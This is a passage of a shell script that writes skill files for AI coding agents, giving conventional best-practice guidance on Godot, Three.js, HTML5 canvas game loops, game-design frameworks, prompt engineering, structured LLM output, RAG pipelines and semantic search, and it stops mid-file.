Prompt: Refactor this enemy spawner system into C++ with proper memory management and event timers.
Application: The AI creates `AEnemySpawner : public AActor`, sets `bCanEverTick = false`, replaces per-frame polling with an `FTimerHandle` spawning cycle, stores references in `TArray<TWeakObjectPtr<AEnemyCharacter>>`, and exposes spawn parameters via `UPROPERTY` to Blueprints.
EOF

cat << 'EOF' > skills/game-development/godot/scene-tree-and-signal-architecture/SKILL.md
---
name: "godot-scene-tree-and-signal-architecture"
description: "Architecting modular, decoupled Godot 4 games in GDScript using the Scene Tree, 'Call Down, Signal Up' communication, typed signals, and custom resources."
category: "game-development"
subcategory: "godot"
language: "gdscript"
framework: "godot"
technology: "godot-4"
difficulty: "intermediate"
tags: ["game-development", "godot", "godot4", "gdscript", "signals", "scene-tree"]
---

# Godot 4 Scene Tree Architecture and Signal Communication

## Purpose
Instruct AI agents to author clean, modular Godot 4 games using idiomatic GDScript, strict scene decoupling, typed signals, and data-driven Custom Resources.

## When to Use
Use when creating 2D/3D games in Godot 4, structuring player controllers, building UI systems, or designing game state management.

## Inputs / Context
Game mechanics, node hierarchy, character controls, signal events, and resource definitions.

## Instructions
1. Adhere to the 'Call Down, Signal Up' Rule:
   - A parent node may directly call methods or modify properties on its child nodes (Call Down).
   - A child node must NEVER call methods or reference properties on its parent node directly; it must emit a typed Signal (Signal Up).
   - This ensures child scenes (like a Player, Coin, or Enemy) can be instanced and tested completely in isolation.
2. Use Godot 4 Typed Signals:
   - Declare signals with explicit parameter types: `signal health_changed(new_health: int, max_health: int)`.
   - Connect signals cleanly in code using callable syntax: `health_changed.connect(_on_health_changed)`.
3. Data-Driven Design with Custom Resources (`class_name ... extends Resource`):
   - Encapsulate configuration data (weapon stats, character attributes) inside custom `Resource` files (`.tres`) rather than hardcoding values in scripts.
4. Process vs. PhysicsProcess:
   - Use `_process(delta)` for visual rendering, animations, UI updates, and non-physics logic.
   - Use `_physics_process(delta)` for kinematic movement (`move_and_slide()`), raycasts, and RigidBody physics.
   - Always multiply movement calculations by `delta` to ensure frame-rate independent gameplay.
5. Node Path Safety:
   - Use `@onready @export var` or unique node names (`%UniqueNode`) rather than fragile hardcoded node paths (`$Path/To/Node`).

## Constraints / Rules
- Never write `get_parent().get_parent().do_something()` in child scripts; use signals.
- Avoid hardcoding absolute node paths like `/root/Main/Player`.
- Never execute physics movement code inside `_process()`.

## Workflow
1. Define data containers as Custom Resources.
2. Construct atomic scene nodes (e.g., `Player.tscn`).
3. Define typed signals for all outward notifications.
4. Connect child signals in parent orchestrator scenes.
5. Verify scene runs independently by pressing F6 in Godot.

## Expected Output
Clean GDScript code for Godot 4 with typed signals, 'Call Down, Signal Up' architecture, and custom `.tres` resources.

## Validation Checklist
- [ ] Does the script follow 'Call Down, Signal Up'?
- [ ] Are signals declared with explicit types?
- [ ] Does physics code live in `_physics_process`?
- [ ] Can the scene be run and tested in isolation (F6)?
- [ ] Are unique node names (`%Node`) or `@export` used for node lookups?

## Common Mistakes & Antipatterns
- Writing `get_node("../../UI/ScoreLabel").text = "100"` from inside a coin script, making the coin crash if instanced in any other level without that exact node hierarchy.
- Forgetting `delta` in movement calculations, causing characters to move 10x faster on 144Hz monitors than 60Hz monitors.
- Connecting signals without disconnecting or verifying duplicate connections.

## Concrete Real-World Example
Scenario: A Godot 4 health component is tightly coupled to the UI by directly modifying a HUD label node, crashing whenever the enemy uses the health component.
Prompt: Decouple this Godot 4 health component using typed signals.
Application: The AI creates `HealthComponent.gd` extending `Node`, declares `signal health_changed(current: int, maximum: int)`, emits the signal on damage, and has the HUD subscribe to the signal from the parent level scene, allowing the component to be reused across both players and enemies.
EOF

cat << 'EOF' > skills/game-development/threejs/webgl-performance-and-scene-graphs/SKILL.md
---
name: "webgl-performance-and-scene-graphs"
description: "Architecting high-performance 3D web experiences using Three.js, instanced meshes (InstancedMesh), geometry disposal, shader materials, and draw-call reduction."
category: "game-development"
subcategory: "threejs"
language: "javascript"
framework: "threejs"
technology: "webgl-threejs"
difficulty: "advanced"
tags: ["game-development", "threejs", "webgl", "3d", "performance", "instancing", "shaders"]
---

# Three.js Scene Graph Architecture and WebGL Render Optimization

## Purpose
Instruct AI agents to author 3D browser graphics in Three.js that minimize WebGL draw calls, manage GPU memory disposal, and maintain consistent 60 FPS on mobile and desktop.

## When to Use
Use when creating interactive 3D product visualizers, WebGL web games, data visualizations, or virtual environments.

## Inputs / Context
3D scene requirements, asset models (glTF/GLB), lighting setup, animation loop, and target hardware constraints.

## Instructions
1. Minimize WebGL Draw Calls using `InstancedMesh`:
   - Never render hundreds or thousands of individual `Mesh` objects sharing the same geometry and material; each Mesh triggers an expensive CPU-GPU draw call.
   - Use `THREE.InstancedMesh` to render tens of thousands of object instances in a single draw call, updating transforms via 4x4 transformation matrices.
2. Prevent GPU Memory Leaks with Explicit Resource Disposal:
   - JavaScript Garbage Collection does NOT free WebGL GPU memory.
   - When removing objects, always explicitly call:
     * `geometry.dispose()`
     * `material.dispose()`
     * `texture.dispose()`
3. Optimize Geometry and Textures:
   - Use Draco or Meshopt-compressed glTF (`.glb`) models.
   - Keep texture dimensions to powers of two (e.g., 512x512, 1024x1024, 2048x2048) for GPU mipmapping.
   - Set texture anisotropy conditionally based on device capability.
4. Optimize Shadow Maps:
   - Restrict shadow-casting lights to 1 or 2 directional lights; disable `castShadow` and `receiveShadow` on non-essential decorative meshes.
   - Size shadow map resolutions prudently (1024x1024 or 2048x2048).
5. Animation Loop Discipline:
   - Never instantiate objects (`new THREE.Vector3()`, `new THREE.Matrix4()`) inside the `requestAnimationFrame` loop. Pre-allocate temporary scratch variables outside the loop to avoid continuous GC thrashing.
6. Handle Viewport Resize and High-DPI Displays:
   - Cap `renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2))`: rendering at 3x or 4x pixel density on ultra-high-res screens destroys mobile GPU fill rate with zero perceptible visual gain.

## Constraints / Rules
- Never create new geometry, material, or vector instances inside the render loop.
- Never remove a mesh from the scene without calling `.dispose()` on its geometry and materials.
- Do not set `pixelRatio` higher than 2.

## Workflow
1. Initialize Three.js Scene, Camera, WebGLRenderer with capped pixel ratio.
2. Pre-allocate scratch vectors for animation loops.
3. Group repeated meshes into `InstancedMesh`.
4. Implement clean disposal function for scene unmount.
5. Monitor draw calls and triangles using `renderer.info`.

## Expected Output
High-performance Three.js 3D application code featuring InstancedMesh batching, pre-allocated scratch math objects, and complete GPU memory disposal.

## Validation Checklist
- [ ] Are repetitive meshes grouped into `InstancedMesh`?
- [ ] Are geometries, materials, and textures explicitly disposed of?
- [ ] Is `renderer.setPixelRatio` capped at `Math.min(window.devicePixelRatio, 2)`?
- [ ] Are vector and matrix allocations kept outside the animation loop?
- [ ] Does `renderer.info.render.calls` verify minimal draw calls (< 50)?

## Common Mistakes & Antipatterns
- Creating 2,000 individual `new THREE.Mesh()` objects for a particle field or forest, triggering 2,000 draw calls and reducing frame rates to 5 FPS.
- Removing a 3D model from the scene via `scene.remove(mesh)` without calling `.dispose()`, causing hundreds of megabytes of GPU VRAM to leak.
- Calling `new THREE.Vector3()` in the render loop running 60 times a second, triggering massive Garbage Collection stutters.

## Concrete Real-World Example
Scenario: An interactive 3D product showcase renders 500 screws and bolts as individual meshes, causing 500 draw calls and heating up mobile devices.
Prompt: Optimize this Three.js scene to render 500 identical bolts efficiently.
Application: The AI converts the individual meshes into a single `THREE.InstancedMesh(boltGeometry, boltMaterial, 500)`, computes positions using pre-allocated matrix scratchpads, caps pixel ratio at 2, reducing draw calls from 500 to 1 and elevating frame rate to 60 FPS.
EOF

cat << 'EOF' > skills/game-development/web-games/canvas-game-loop-architecture/SKILL.md
---
name: "canvas-game-loop-architecture"
description: "Building performant 2D browser games using HTML5 Canvas, fixed time-step game loops, sprite atlas batching, spatial hashing, and keyboard/touch input managers."
category: "game-development"
subcategory: "web-games"
language: "javascript"
framework: "none"
technology: "html5-canvas"
difficulty: "intermediate"
tags: ["game-development", "web-games", "canvas", "html5", "game-loop", "sprite-batching", "spatial-hash"]
---

# HTML5 Canvas 2D Game Loop Architecture and Sprite Batching

## Purpose
Provide AI agents with standards for creating robust, frame-rate independent 2D games running directly on native HTML5 Canvas without heavy external engines.

## When to Use
Use when building lightweight 2D web games, casual browser games, gamified interactive dashboards, or educational simulations.

## Inputs / Context
Game canvas element, game entities, physics rules, sprite sheets, and user controls.

## Instructions
1. Implement a Fixed Time-Step Game Loop with Variable Render (Accumulator Pattern):
   - Never tie physics simulation directly to `requestAnimationFrame` delta time, as variable frame rates cause physics tunneling and instability.
   - Use a fixed physics time-step (e.g., 60 updates/sec = 16.66ms) with an accumulator:
     * Add elapsed time to accumulator.
     * While accumulator >= fixedDelta, update physics by fixedDelta and decrement accumulator.
     * Render the visual state once per frame using interpolation.
2. Use Single Sprite Sheets / Texture Atlases:
   - Combine all game sprites into a single image sheet; draw sprites using `ctx.drawImage(atlas, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight)` to eliminate image loading lag and context switching.
3. Optimize Canvas Rendering:
   - Clear only dirty screen regions or use `ctx.clearRect(0, 0, width, height)` cleanly.
   - Round coordinate positions to whole integers (`Math.round(x)`) before drawing; drawing on fractional pixels triggers expensive sub-pixel anti-aliasing.
   - Use OffscreenCanvas for pre-rendering static backgrounds or complex procedural terrain.
4. Spatial Hashing for Fast 2D Collision Detection:
   - Replace O(n²) all-pairs collision checking with a 2D Spatial Hash Grid to only test entities occupying the same spatial cell.
5. State-Driven Input Handling:
   - Track key presses and touch coordinates in an input manager holding boolean state maps; read input state inside the update loop rather than executing game logic inside raw DOM event listeners.

## Constraints / Rules
- Never calculate physics directly using unconstrained variable delta times.
- Avoid drawing on fractional pixel coordinates in Canvas 2D.
- Do not load individual image files for every single game animation frame.

## Workflow
1. Initialize Canvas and handle Retina/DPI scaling.
2. Implement input listener updating state maps.
3. Construct fixed time-step game loop with accumulator.
4. Build spatial hash grid for collision checks.
5. Render sprite atlas frames with rounded integer coordinates.

## Expected Output
Modular 2D HTML5 Canvas game engine implementation featuring a fixed time-step loop, sprite sheet renderer, and spatial hash collision detection.

## Validation Checklist
- [ ] Is physics updated using a fixed time-step accumulator?
- [ ] Are sprites rendered from a unified sprite sheet atlas?
- [ ] Are drawing coordinates rounded to integers to prevent sub-pixel blur?
- [ ] Is collision detection accelerated using spatial partitioning?
- [ ] Does gameplay speed remain identical on 60Hz, 120Hz, and 144Hz monitors?

## Common Mistakes & Antipatterns
- Updating physics with `x += speed * dt` where `dt` is variable, causing characters to fall through floors when the browser stutters.
- Drawing sprites at floating-point coordinates like `(104.382, 219.841)`, forcing the browser CPU/GPU to anti-alias every edge and dropping frame rates.
- Adding hundreds of event listeners directly to window without central input buffering.

## Concrete Real-World Example
Scenario: A 2D canvas platformer game runs at double speed on 120Hz gaming laptops and allows players to jump through platforms when lag occurs.
Prompt: Refactor this HTML5 canvas game loop to use a fixed time-step accumulator.
Application: The AI implements a canonical Glenn Fiedler accumulator loop with a 16.6ms fixed step, isolates rendering to `requestAnimationFrame`, clamps max accumulator time to avoid 'spiral of death', and guarantees identical physics across all monitor refresh rates.
EOF

cat << 'EOF' > skills/game-development/game-design/mechanics-dynamics-aesthetics-loop/SKILL.md
---
name: "mechanics-dynamics-aesthetics-loop"
description: "Designing compelling game loops and player progression systems using the Mechanics-Dynamics-Aesthetics (MDA) framework, flow channels, and economy balancing."
category: "game-development"
subcategory: "game-design"
language: "agnostic"
framework: "none"
technology: "game-design-framework"
difficulty: "intermediate"
tags: ["game-development", "game-design", "mda-framework", "core-loop", "player-progression", "balancing"]
---

# Game Design Mechanics-Dynamics-Aesthetics (MDA) and Core Loops

## Purpose
Provide AI agents with structured game design methodology to architect engaging core gameplay loops, player progression mechanics, and balanced game economies.

## When to Use
Use when designing game design documents (GDD), conceptualizing gameplay loops, tuning player difficulty curves, or designing reward economies.

## Inputs / Context
Game genre, target player emotional aesthetic (challenge, fantasy, fellowship, discovery), platform, and session length target.

## Instructions
1. Apply the MDA Framework:
   - Mechanics: The formal rules, mathematical systems, actions, and algorithms (e.g., jump height, health points, dice rolls).
   - Dynamics: The run-time behaviors that emerge when players interact with the mechanics (e.g., aggressive flanking, resource hoarding, bidding wars).
   - Aesthetics: The emotional experiences evoked in the player (e.g., Sensation, Fantasy, Narrative, Challenge, Fellowship, Discovery, Expression, Submission).
   - Design from Aesthetics to Mechanics; analyze from Mechanics to Aesthetics.
2. Construct the Nested Core Loop:
   - Primary Loop (Seconds): Moment-to-moment action (e.g., Aim -> Shoot -> Dodge).
   - Secondary Loop (Minutes): Objective fulfillment (e.g., Clear Room -> Loot Chest -> Reach Checkpoint).
   - Tertiary Loop (Hours/Days): Long-term progression (e.g., Level Up -> Upgrade Gear -> Unlock New Biomes).
3. Maintain Csikszentmihalyi's Flow Channel:
   - Balance Challenge Level vs. Player Skill Level.
   - If Challenge > Skill: Player experiences Anxiety and Frustration.
   - If Skill > Challenge: Player experiences Boredom.
   - Implement dynamic difficulty adjustments, skill checkpoints, and progressive mechanics introduction.
4. Design Balanced Game Economies:
   - Explicitly define Faucets (sources that generate currency/resources) and Sinks (mechanics that permanently consume resources).
   - If Faucets > Sinks: Hyperinflation occurs, rendering progression trivial.
   - If Sinks > Faucets: Player progress stalls into a punitive grind.

## Constraints / Rules
- Never introduce new mechanics without an introductory tutorial or safe experimentation space.
- Avoid designing reward economies with infinite resource generation and no sink mechanisms.
- Do not confuse game mechanics (rules) with player dynamics (emergent behavior).

## Workflow
1. Define target aesthetic emotional response.
2. Map the 3-tier nested core loop (seconds, minutes, hours).
3. Specify formal mechanics and rule equations.
4. Model the resource economy (faucets, converters, sinks).
5. Chart the difficulty progression against the flow channel.

## Expected Output
Comprehensive Game Design Document (GDD) section detailing the core loop diagram, MDA breakdown, economy faucet/sink balance, and progression curve.

## Validation Checklist
- [ ] Are primary, secondary, and tertiary core loops clearly mapped?
- [ ] Are target aesthetic emotions identified using MDA?
- [ ] Is the resource economy balanced with proportional faucets and sinks?
- [ ] Does difficulty scale in proportion to expected player skill progression?
- [ ] Are emergent dynamics anticipated and bounded?

## Common Mistakes & Antipatterns
- Creating a game with only a primary loop (shooting) but no secondary or tertiary loops, causing players to lose interest after 5 minutes due to lack of purpose.
- Flooding the player with gold rewards without adding meaningful high-value sinks, destroying the late-game economy.
- Introducing 15 complex controls in the first 30 seconds of gameplay, spiking cognitive load and triggering player abandonment.

## Concrete Real-World Example
Scenario: A roguelike deckbuilder game feels addictive in the first 10 minutes but becomes trivial and boring after the player collects high-damage cards.
Prompt: Analyze and re-balance this roguelike deckbuilder's core loop and economy using the MDA framework.
Application: The AI diagnoses an economy imbalance where damage scaling (faucet) vastly exceeds monster health growth (sink), designs diminishing returns on card upgrades, introduces situational enemy resistances to demand varied deck strategies, and re-establishes the flow channel.
EOF

cat << 'EOF' > skills/ai/prompting/chain-of-thought-system-prompts/SKILL.md
---
name: "chain-of-thought-system-prompts"
description: "Architecting robust, model-agnostic system prompts utilizing XML tagging, few-shot examples, Chain-of-Thought (CoT) reasoning, and strict guardrails."
category: "ai"
subcategory: "prompting"
language: "agnostic"
framework: "none"
technology: "prompt-engineering"
difficulty: "intermediate"
tags: ["ai", "prompting", "chain-of-thought", "system-prompts", "few-shot", "guardrails"]
---

# Model-Agnostic Chain-of-Thought System Prompt Engineering

## Purpose
Provide AI agents and prompt engineers with standardized structural patterns for authoring high-reliability, model-agnostic system prompts that produce deterministic outputs.

## When to Use
Use when crafting system instructions for LLM applications, designing automated agent personas, building extraction pipelines, or eliminating hallucination.

## Inputs / Context
Task objective, target output schema, domain rules, edge cases, and representative positive/negative few-shot examples.

## Instructions
1. Structure System Prompts using Semantic XML Tags:
   - Use clear XML boundary tags to delineate functional prompt sections:
     * `<role>`: Explicit identity, domain expertise, and operational tone.
     * `<context>`: Background scenario and system capabilities.
     * `<instructions>`: Granular, sequential, imperative rules.
     * `<constraints>`: Negative guardrails (things the model must NEVER do).
     * `<reasoning>`: Mandatory step-by-step thinking instructions before outputting the final answer.
     * `<examples>`: High-quality few-shot input/output pairs.
     * `<output_format>`: Exact format constraints (JSON schema, markdown table).
2. Mandate Chain-of-Thought (CoT) Reasoning:
   - Instruct the model to reason through constraints and edge cases in a private `<thinking>` scratchpad tag before generating the final deliverable.
   - Explicit scratchpad reasoning drastically reduces logical errors, hallucinations, and formatting violations.
3. Provide Diverse Few-Shot Demonstrations:
   - Include at least 2-3 realistic few-shot examples demonstrating both standard happy paths and tricky edge cases (e.g., incomplete data, ambiguous queries).
4. Enforce Negative Guardrails and Fallbacks:
   - Explicitly instruct the model on what to do when information is unavailable: 'If the retrieved context does not contain the answer, reply exactly: "Information not found in context." Do not extrapolate or guess.'
5. Maintain Model Agnosticism:
   - Avoid model-specific proprietary prompt syntax; use universal structural conventions (XML, Markdown headers) that work reliably across Claude, GPT-4, Gemini, Llama, and Mistral.

## Constraints / Rules
- Never write vague, subjective instructions like 'Be helpful and concise' without defining operational criteria.
- Never place few-shot examples without clear delimiters separating inputs from outputs.
- Avoid contradictory rules that force the model into logical deadlocks.

## Workflow
1. Define task role and boundary constraints.
2. Structure sections using semantic XML tags.
3. Draft positive and negative few-shot examples.
4. Enforce scratchpad thinking requirements.
5. Benchmark prompt against a suite of 20 edge-case test queries.

## Expected Output
Modular, model-agnostic system prompt template utilizing XML section tags, scratchpad reasoning, and robust negative constraints.

## Validation Checklist
- [ ] Are prompt sections delineated using clear XML tags?
- [ ] Is Chain-of-Thought scratchpad reasoning required before output?
- [ ] Are few-shot examples included with both input and output?
- [ ] Is there an explicit fallback instruction for missing/ambiguous information?
- [ ] Does the prompt perform consistently across multiple LLM families?

## Common Mistakes & Antipatterns
- Dumping 2,000 words of unstructured stream-of-consciousness text into the prompt without headings or delimiters, leading to high instruction drift.
- Telling the model 'never make mistakes', which provides zero actionable guidance.
- Omitting instructions for handling missing context, forcing the model to hallucinate plausible-sounding answers.

## Concrete Real-World Example
Scenario: A customer support AI bot frequently invents company refund policies when users ask about non-standard return situations.
Prompt: Write a robust, grounded system prompt for this return-policy customer support bot.
Application: The AI authors an XML-delimited prompt with `<role>`, `<context>`, `<rules>`, and `<constraints>`, mandates a `<thinking>` tag to cross-reference customer questions against the provided refund knowledge base, and explicitly instructs the bot to state 'I cannot verify this policy' if an exact match is absent.
EOF

cat << 'EOF' > skills/ai/llm-integration/structured-json-output-contracts/SKILL.md
---
name: "structured-json-output-contracts"
description: "Integrating LLMs into production backends with guaranteed JSON schema conformity, Pydantic/Zod parsing, repair pipelines, and temperature tuning."
category: "ai"
subcategory: "llm-integration"
language: "python"
framework: "none"
technology: "llm-json"
difficulty: "intermediate"
tags: ["ai", "llm-integration", "structured-output", "json-schema", "pydantic", "validation"]
---

# LLM Structured JSON Outputs and Schema Enforcement

## Purpose
Instruct AI agents to author reliable backend LLM integration code that guarantees structured JSON output, validates payloads against strict schemas, and heals malformed responses.

## When to Use
Use when extracting data from documents, invoking LLMs to populate database records, generating API payloads, or driving automated workflows.

## Inputs / Context
Pydantic/Zod schema definition, LLM client API, prompt template, and retry policies.

## Instructions
1. Enforce Structured Outputs via Provider APIs:
   - Configure the LLM client to use strict JSON mode or schema-constrained decoding (e.g., `response_format={"type": "json_object"}` or provider-native JSON Schema enforcement).
2. Tune Generation Hyperparameters:
   - Set `temperature = 0.0` or `temperature = 0.1` for deterministic data extraction and structured categorization tasks; higher temperatures increase syntax errors.
3. Validate Output Against Strict Schema Validators:
   - Parse the returned string through Pydantic v2 (`MyModel.model_validate_json(raw_text)`) or Zod (`MySchema.parse(JSON.parse(raw_text))`).
   - Never trust that an LLM response is valid JSON without programmatic runtime validation.
4. Implement a Self-Correction / Healing Retry Loop:
   - If JSON decoding or schema validation fails, capture the exact validation error message.
   - Send the malformed output and the validator error back to the model in a follow-up repair turn:
     `"The previous output failed schema validation: {error_details}. Please fix the JSON and return only valid JSON."`
   - Cap repair attempts at 2-3 retries before failing over or raising an exception.
5. Strip Markdown Code Blocks:
   - LLMs frequently wrap JSON in ```json ... ``` markdown code fences; always strip markdown fences before passing text to the JSON parser.

## Constraints / Rules
- Never evaluate LLM outputs with `eval()` or dangerous deserializers.
- Never pass unvalidated LLM output directly into database write queries.
- Avoid using high temperature (> 0.5) when generating structured data schemas.

## Workflow
1. Define target Pydantic/Zod schema with explicit field descriptions.
2. Generate JSON schema and inject into prompt instructions and provider settings.
3. Invoke LLM with temperature 0.0.
4. Strip markdown fences and parse via schema validator.
5. On validation error, trigger automatic repair prompt loop.

## Expected Output
Robust LLM integration function accepting unstructured input and returning a validated, typed Pydantic or TypeScript object with automated repair handling.

## Validation Checklist
- [ ] Is temperature set to 0.0 for deterministic output?
- [ ] Is raw response parsed through a runtime schema validator?
- [ ] Are markdown code fences stripped automatically before parsing?
- [ ] Is an automated error-correcting repair loop implemented for validation failures?
- [ ] Are field descriptions included in the schema to guide model generation?

## Common Mistakes & Antipatterns
- Calling `json.loads(response)` directly, causing the backend service to crash whenever the LLM includes conversational preamble text before the JSON object.
- Discarding the validation error during retries instead of providing the exact schema error to the model to guide its correction.
- Leaving field meanings ambiguous in the schema without docstrings or descriptions.

## Concrete Real-World Example
Scenario: A resume parsing service frequently crashes because the LLM occasionally omits the required `graduation_year` field or formats it as a string instead of an integer.
Prompt: Write a resilient resume extraction function using Pydantic and an LLM with automated error correction.
Application: The AI defines a `ResumeSchema` with Pydantic v2, passes the JSON schema in the system prompt, catches `ValidationError`, and feeds the exact missing/invalid field error back into a repair prompt, achieving a 99.8% extraction success rate.
EOF

cat << 'EOF' > skills/ai/rag/retrieval-pipeline-design/SKILL.md
---
name: "retrieval-pipeline-design"
description: "Architecting enterprise RAG pipelines with semantic document chunking, hybrid keyword/vector search, cross-encoder reranking, and citation grounding."
category: "ai"
subcategory: "rag"
language: "python"
framework: "none"
technology: "rag-pipeline"
difficulty: "advanced"
tags: ["ai", "rag", "retrieval", "hybrid-search", "reranking", "chunking", "grounding"]
---

# Retrieval-Augmented Generation (RAG) Pipeline Architecture

## Purpose
Provide AI agents with complete architecture standards for building accurate, scalable Retrieval-Augmented Generation (RAG) systems that eliminate hallucinations and provide verifiable citations.

## When to Use
Use when building enterprise knowledge base search, technical documentation Q&A, legal/compliance assistants, or customer support bots.

## Inputs / Context
Source documents (PDFs, Markdown, HTML), embedding model, vector store, search query, and LLM generator.

## Instructions
1. Document Ingestion and Semantic Chunking:
   - Never use arbitrary character-count splitting without overlap.
   - Use Document-Aware / Semantic Chunking: split on natural structural boundaries (Markdown headings `#`, `##`, paragraphs, table rows).
   - Target chunk sizes: 300 to 500 tokens with 10-15% overlap to preserve context across boundaries.
   - Preserve Metadata: Attach `source_url`, `doc_id`, `chunk_index`, `title`, and `section_header` to every chunk vector.
2. Implement Hybrid Search (Dense + Sparse):
   - Dense Retrieval (Vector): Uses embeddings (e.g., text-embedding-3) to capture high-level semantic meaning and conceptual similarity.
   - Sparse Retrieval (Keyword / BM25): Captures exact keyword matches, technical codes, product SKUs, and rare proper nouns that vector search often misses.
   - Merge results using Reciprocal Rank Fusion (RRF): `score = 1 / (60 + rank_dense) + 1 / (60 + rank_sparse)`.
3. Apply Cross-Encoder Reranking:
   - Retrieve top 25-50 candidates from hybrid search.
   - Pass query and candidate chunks through a Cross-Encoder Reranker model (e.g., Cohere Rerank or BGE-Reranker) to score true contextual relevance.
   - Take the top 3-5 reranked chunks for generation.
4. Grounded Generation and Citations:
   - Inject reranked chunks into the system prompt wrapped in `<context>` tags.
   - Instruct the generator: 'Answer ONLY based on the provided context. Attach inline citations [Source N] for every factual statement.'
   - If the answer cannot be answered from the context, instruct the model to state so explicitly.

## Constraints / Rules
- Never stuff 50 unranked raw vector search results into the prompt context; context stuffing degrades generation quality ('Lost in the Middle' phenomenon).
- Never discard document metadata during chunking.
- Avoid relying solely on vector search for queries containing exact alphanumeric identifiers (e.g., error code 'ERR_4091').

## Workflow
1. Ingest and parse raw documents into markdown representation.
2. Chunk text semantically and index into Vector DB + BM25 search.
3. On user query, execute hybrid search (Vector + BM25).
4. Merge candidates with Reciprocal Rank Fusion.
5. Rerank top 30 chunks with a Cross-Encoder down to top 5.
6. Generate grounded response with explicit citations.

## Expected Output
Modular Python RAG pipeline implementation featuring semantic chunking, hybrid BM25/vector search, cross-encoder reranking, and citation generation.

## Validation Checklist
- [ ] Are documents chunked along natural semantic boundaries with metadata?
- [ ] Is hybrid search combining dense vectors and sparse BM25 implemented?
- [ ] Are retrieved candidates reranked using a cross-encoder model?
- [ ] Does the prompt require inline citations referencing specific retrieved chunks?
- [ ] Does the system gracefully refuse to answer when context is insufficient?

## Common Mistakes & Antipatterns
- Relying exclusively on vector search for technical docs, causing searches for specific function names like `sqlite3_open_v2` to return generic SQLite overviews instead of the exact API docs.
- Splitting text mid-sentence with rigid 500-character blocks, destroying table structures and code snippets.
- Passing chunks without source metadata, making it impossible for the user to verify where the generated answer came from.

## Concrete Real-World Example
Scenario: An internal company HR policy bot provides incorrect 401(k) vesting rules because vector search retrieved a stale 2021 handbook along with the 2024 policy.
Prompt: Build a hybrid RAG pipeline with reranking and metadata filtering for this company policy assistant.
Application: The AI chunks policies by section header, filters chunks by `effective_year == 2024`, executes hybrid BM25 + embedding search, scores results with a cross-encoder reranker, and outputs the answer with clickable source references.
EOF

cat << 'EOF' > skills/ai/embeddings/semantic-search-and-reranking/SKILL.md
---
name: "semantic-search-and-reranking"
description: "Designing high-accuracy semantic search engines utilizing dense vector embeddings, cosine vs dot-product similarity, HNSW indexing, and cross-encoder reranking."
category: "ai"
subcategory: "embeddings"
language: "python"
framework: "none"
technology: "vector-search"
difficulty: "advanced"
tags: ["ai", "embeddings", "semantic-search", "hnsw", "cosine-similarity", "reranking", "vector-db"]
---

# Embedding Models, Semantic Search, and Reranking Architecture

## Purpose
Instruct AI agents to author high-accuracy semantic search systems, selecting appropriate distance metrics, optimizing vector indexing (HNSW), and applying two-stage retrieval.

## When to Use
Use when implementing semantic search over product catalogs, knowledge bases, document repositories, or recommendation systems.

## Inputs / Context
Text corpus, query text, embedding model specifications, vector index parameters (HNSW/IVF), and reranking model.

## Instructions
1. Distance Metrics and Normalization:
   - If embeddings are unit-normalized (L2 norm = 1, as in OpenAI, Cohere, and HuggingFace models), Cosine Similarity is mathematically identical to Dot Product (`Inner Product`).
   - Use Dot Product for normalized vectors: it is computationally faster than computing full Cosine Similarity because it eliminates the square-root denominator calculation.
   - Use Euclidean (L2) distance only when vector magnitude carries independent domain meaning.
2. Vector Index Selection and Tuning:
   - Use HNSW (Hierarchical Navigable Small World) for sub-millisecond approximate nearest neighbor (ANN) search with high recall (> 95%).
   - Tune HNSW parameters:
     * `M` (max connections per node, typically 16-64): higher `M` improves recall at the cost of memory.
     * `efConstruction` (size of dynamic candidate list during build, typically 64-200): higher values improve index quality.
     * `efSearch` (search candidate list size, typically 32-100): trade search latency against recall.
3. Two-Stage Retrieval Architecture:
   - Stage 1 (Fast Retrieval): High-speed ANN search via HNSW retrieving top 50-100 candidates based on bi-encoder embeddings.
   - Stage 2 (Precision Reranking): Deep cross-encoder reranker evaluating full cross-attention between `(query, document)` to score the final top 10 results.
4. Asymmetric Search Task Types:
   - For models that require task prefixes (e.g., E5 or BGE), prepend `query: ` to queries and `passage: ` to documents to ensure optimal vector space alignment.
5. Batch and Cache Embeddings:
   - Cache precomputed document embeddings; never regenerate embeddings for static text on every search query.

## Constraints / Rules
- Never calculate unindexed exact flat vector comparisons (O(N) brute force) over datasets larger than 10,000 items in production.
- Do not mix different embedding models in the same vector space; vectors from different models are mathematically incompatible.
- Avoid using Dot Product on unnormalized vectors when cosine angle is the intended metric.

## Workflow
1. Normalize text and compute document embeddings in batches.
2. Build HNSW vector index with tuned `M` and `efConstruction`.
3. Prepend task prefixes if required by the embedding model.
4. On query, compute query embedding and retrieve top 50 via HNSW.
5. Rerank top 50 with cross-encoder and return top 10.

## Expected Output
High-performance semantic search implementation with HNSW indexing, dot-product scoring, and cross-encoder reranking.

## Validation Checklist
- [ ] Are vectors normalized when using Dot Product similarity?
- [ ] Is HNSW index configured with appropriate `M` and `ef` parameters?
- [ ] Is a two-stage retrieval (bi-encoder retrieval + cross-encoder rerank) pipeline used?
- [ ] Are document embeddings cached and computed in batches?
- [ ] Is search latency under 50ms for the retrieval phase?

## Common Mistakes & Antipatterns
- Comparing vectors generated by two different models (e.g., querying a database of ada-002 embeddings using a text-embedding-3 query vector), yielding completely random, meaningless results.
- Running brute-force flat scans across 1,000,000 vectors, causing search queries to take several seconds and consume all server memory.
- Forgetting to normalize vectors before calculating dot-product similarity, causing long documents to score higher purely due to vector magnitude.

## Concrete Real-World Example
Scenario: An enterprise legal contract search system returns irrelevant boilerplate documents because simple vector similarity matches broad vocabulary without understanding legal relevance.
Prompt: Implement a two-stage semantic search engine with HNSW indexing and cross-encoder reranking.
Application: The AI indexes normalized contract clauses in an HNSW vector index, performs fast candidate retrieval for the top 40 clauses using inner product distance, runs candidates through a cross-encoder model to score exact contextual intent, elevating search recall from 62% to 94%.
EOF

cat << 'EOF' > skills/ai/structured-output/schema-validation-enforcement/SKILL.md
---
name: "schema-validation-enforcement"
description: "Enforcing schema boundaries and structural type coercion on untrusted LLM outputs using Zod, Pydantic, JSON Schema, and defensive fallback defaults."
category: "ai"
subcategory: "structured-output"
language: "typescript"
framework: "none"
technology: "schema-enforcement"
difficulty: "intermediate"
tags: ["ai", "structured-output", "zod", "pydantic", "type-safety", "data-validation"]
---

# Strict Schema Validation and Type Coercion for LLM Outputs

## Purpose
Equip AI agents with strict defensive validation routines for sanitizing, coercing, and verifying complex nested data generated by language models before ingestion into databases.

## When to Use
Use when parsing LLM-generated summaries, classification tags, extraction dictionaries, or database seed data.

## Inputs / Context
